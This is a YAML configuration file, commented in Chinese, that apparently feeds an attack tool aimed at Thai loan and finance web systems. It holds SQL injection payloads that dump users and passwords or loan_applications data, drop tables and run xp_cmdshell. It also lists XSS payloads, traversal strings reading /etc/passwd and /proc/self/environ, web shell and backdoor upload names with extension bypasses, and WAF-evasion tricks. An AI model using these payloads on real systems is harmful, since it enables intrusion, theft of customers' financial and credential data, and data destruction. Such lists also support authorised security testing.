# 泰语特定攻击载荷配置
thai_payloads:
  sql_injection:
    basic:
      - "' OR 1=1-- "
      - "' UNION SELECT username,password FROM users-- "
      - "' AND (SELECT COUNT(*) FROM users) > 0-- "
      - "'; DROP TABLE users;-- "

    thai_language:
      - "สินเชื่อ' OR 1=1-- "
      - "เงินกู้' UNION SELECT * FROM users-- "
      - "คำร้อง' OR '1'='1'-- "
      - "สมัคร' AND 1=1-- "

    advanced:
      - "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- "
      - "' AND (SELECT COUNT(*) FROM loan_applications) > 0-- "
      - "' UNION SELECT customer_name,loan_amount FROM loan_applications-- "
      - "'; EXEC xp_cmdshell 'net user';-- "

    time_based:
      - "' OR SLEEP(5)-- "
      - "สินเชื่อ' AND SLEEP(10)-- "
      - "' AND (SELECT SLEEP(3) FROM users WHERE id=1)-- "
      - "'; WAITFOR DELAY '00:00:05'-- "

  xss:
    basic:
      - "<script>alert('Thai Loan Hack')</script>"
      - "<img src=x onerror=alert('สินเชื่อ')>"
      - "';alert('เงินกู้');//"
      - "<svg onload=alert('Thai Finance')>"

    thai_context:
      - "<script>alert('ระบบสินเชื่อถูกโจมตี')</script>"
      - "<img src=x onerror=alert('เงินกู้รั่วไหล')>"
      - "';alert('ข้อมูลลูกค้า');//"
      - "<svg onload=alert('ธนาคารไทย')>"

    advanced:
      - "<iframe src=javascript:alert('XSS')></iframe>"
      - "<body onload=alert('Loan System')>"
      - "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//"
      - "<script>fetch('/api/users').then(r=>r.json()).then(d=>console.log(d))</script>"

  path_traversal:
    basic:
      - "../../../etc/passwd"
      - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
      - "/proc/self/environ"
      - "....//....//....//etc/passwd"

    thai_system:
      - "../../../var/log/thai_loan.log"
      - "..\\..\\..\\thai_loan_system\\config.ini"
      - "/proc/version"
      - "/etc/hostname"

    advanced:
      - "..%2f..%2f..%2fetc%2fpasswd"
      - "..%252f..%252f..%252fetc%252fpasswd"
      - "....\\/....\\/....\\/etc\\/passwd"
      - "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"

  file_upload:
    php:
      - "shell.php"
      - "webshell.thai.php"
      - "loan_system.php"
      - "สินเชื่อ.php"
      - "backdoor.thai.html"

    asp:
      - "shell.asp"
      - "cmd.thai.asp"
      - "webshell.asa"
      - "loan_system.aspx"

    bypass:
      - "shell.php%00.jpg"
      - "shell.pHp"
      - "shell.php5"
      - "shell.phtml"

# 泰国WAF绕过技术配置
thai_waf_bypass:
  encoding:
    - "URL编码"
    - "Unicode编码"
    - "十六进制编码"
    - "Base64编码"
    - "泰语字符混淆"
    - "双重URL编码"
    - "UTF-7编码"

  comment_injection:
    - "/**/"
    - "/* thai */"
    - "-- เงินกู้"
    - "# สินเชื่อ"
    - "/* loan */"
    - "/* bypass */"
    - "--comment"

  case_variation:
    - "SeLeCt"
    - "UNiOn"
    - "FrOm"
    - "WhErE"
    - "InSeRt"
    - "DrOp"
    - "CrEaTe"

  whitespace:
    - "/**/"
    - "%20"
    - "+"
    - "%09"  # Tab
    - "%0A"  # Newline
    - "%0D"  # Carriage return
    - "%0B"  # Vertical tab

  logical_bypass:
    - "1='1"
    - "1=1"
    - "true"
    - "'1'='1'"
    - "1 AND 1=1"
    - "' OR '1'='1"

